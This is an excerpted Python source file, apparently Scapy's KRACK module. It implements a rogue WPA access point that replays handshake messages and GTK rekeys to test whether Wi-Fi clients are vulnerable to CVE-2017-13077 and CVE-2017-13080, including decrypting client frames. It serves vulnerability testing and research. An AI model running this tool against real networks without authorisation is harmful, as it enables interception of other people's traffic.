...
from scapy.modules.krack.crypto import parse_data_pkt, parse_TKIP_hdr, build_TKIP_payload, check_MIC_ICV, MICError, ICVError, build_MIC_ICV, customPRF512, ARC4_encrypt
...
class KrackAP(Automaton):
    ...
    def parse_args(
        ...
        **kwargs,
        ...
        self.dhcp_server = DHCPOverWPA(send_func=self.send_ether_over_wpa, pool=Net('192.168.42.128/25'), network='192.168.42.0/24', gw='192.168.42.1')
        self.arp_sent = []
        self.arp_to_send = 0
        self.arp_retry = 0
    ...
    def run(self, *args, **kwargs):
        log_runtime.warning('AP started with ESSID: %s, BSSID: %s', self.ssid, self.mac)
    ...
    def build_ap_info_pkt(self, layer_cls, dest):
        ...
        return (
            ...
            / layer_cls(timestamp=ts, beacon_interval=100, cap='ESS+privacy')
            / Dot11Elt(ID='SSID', info=self.ssid)
            / Dot11EltRates(rates=[130, 132, 139, 150, 12, 18, 24, 36])
            / Dot11EltDSSSet(channel=self.channel)
            / Dot11EltRSN(group_cipher_suite=RSNCipherSuite(cipher=0x2), pairwise_cipher_suites=[RSNCipherSuite(cipher=0x2)], akm_suites=[AKMSuite(suite=0x2)])
        )
    ...
    def send_wpa_enc(self, data, iv, seqnum, dest, mic_key, key_idx=0, additionnal_flag=['from-DS'], encrypt_key=None):
    ...
    def send_wpa_to_client(self, data, **kwargs):
        ...
        return self.send_wpa_enc(data, next(self.client_iv), next(self.seq_num), self.client, self.mic_ap_to_sta, **kwargs)

    def send_wpa_to_group(self, data, dest='ff:ff:ff:ff:ff:ff', **kwargs):
        kwargs.setdefault('encrypt_key', self.gtk)
        return self.send_wpa_enc(data, next(self.group_iv), next(self.seq_num), dest, self.mic_ap_to_group, **kwargs)
    ...
    def deal_common_pkt(self, pkt):
        ...
        if ARP in pkt and pkt[ARP].op == 1 and pkt[ARP].pdst == self.dhcp_server.gw:
    ...
    def send_auth_response(self, pkt):
        ...
        rep /= Dot11Auth(seqnum=2, algo=pkt[Dot11Auth].algo, status=pkt[Dot11Auth].status)

        self.send(rep)

    @ATMT.receive_condition(AUTH_RESPONSE_SENT)
    def assoc_received(self, pkt):
        if Dot11AssoReq in pkt and pkt.addr1 == pkt.addr3 == self.mac and pkt[Dot11Elt :: {'ID': 0}].info == self.ssid:
    ...
    def wpa_handshake_1_sent(self, pkt):
        ...
        if RadioTap not in pkt:
            return
        if EAPOL in pkt and pkt.addr1 == pkt.addr3 == self.mac and pkt[EAPOL].load[1:2] == b'\x01':
    ...
    def wpa_handshake_3_sent(self, pkt):
        ...
        if RadioTap not in pkt:
            return
        if EAPOL in pkt and pkt.addr1 == pkt.addr3 == self.mac and pkt[EAPOL].load[1:3] == b'\x03\x09':
    ...
    def krack_dispatch(self):
        ...
        if self.double_3handshake and (self.krack_state & 1 == 0) and (now - self.time_handshake_end) > self.wait_3handshake:
            log_runtime.info('Trying to trigger CVE-2017-13077')
            raise self.ANALYZE_DATA().action_parameters(send_3handshake=True)

        # GTK rekeying
        if (self.krack_state & 2 == 0) and (now - self.time_handshake_end) > self.wait_gtk:
    ...
    def extract_iv(self, pkt):
        ...
        iv = TSC[0] | (TSC[1] << 8) | (TSC[2] << 16) | (TSC[3] << 24) | (TSC[4] << 32) | (TSC[5] << 40)
        ...
        if self.last_iv is None:
            ...
            if iv <= self.last_iv:
                log_runtime.warning('IV re-use!! Client seems to be ' 'vulnerable to handshake 3/4 replay ' '(CVE-2017-13077)')
        ...
        try:
            data_clear = check_MIC_ICV(data, self.mic_sta_to_ap, pkt.addr2, pkt.addr3)
        ...
        if data_clear is None:
            ...
            try:
                ...
                log_runtime.warning('Client has installed an all zero ' 'encryption key (TK)!!')
            except (ICVError, MICError):
                pass

        if data_clear is None:
            log_runtime.warning('Unable to decode the packet, something went ' 'wrong')
    ...
    def get_gtk_2(self, pkt):
        ...
        if EAPOL in pkt_clear and pkt.addr1 == pkt.addr3 == self.mac and pkt_clear[EAPOL].load[1:3] == b'\x03\x01':
    ...
    def send_arp_req(self):
        if self.krack_state & 4 == 0:
            ...
            self.arp_target_ip = self.dhcp_server.leases.get(self.client, self.arp_target_ip)  # noqa: E501
            assert self.arp_target_ip is not None

            # Send the first ARP requests, for control test
            log_runtime.info("Send ARP who-was from '%s' to '%s'", self.arp_source_ip, self.arp_target_ip)
            arp_pkt = self.send_wpa_to_group(
                LLC() / SNAP() / ARP(op='who-has', psrc=self.arp_source_ip, pdst=self.arp_target_ip, hwsrc=self.mac),
            ...
            if self.arp_to_send < len(self.arp_sent):
                ...
                self.arp_to_send = 0
                self.arp_retry += 1
                log_runtime.info('Trying to trigger CVE-2017-13080 %d/%d', self.arp_retry, self.ARP_MAX_RETRY)
                if self.arp_retry > self.ARP_MAX_RETRY:
                    # We retries 100 times to send GTK, then already sent ARPs
                    log_runtime.warning('Client is likely not vulnerable to ' 'CVE-2017-13080')
                    raise self.EXIT()
    ...
    def check_arp_reply(self, pkt):
        ...
        # ARP.op 2: is-at
        if decoded_pkt[ARP].op == 2 and decoded_pkt[ARP].psrc == self.arp_target_ip and decoded_pkt[ARP].pdst == self.arp_source_ip:
            ...
            if self.krack_state & 4 == 0:
                ...
                log_runtime.warning('Broadcast packet accepted twice!! ' '(CVE-2017-13080)')
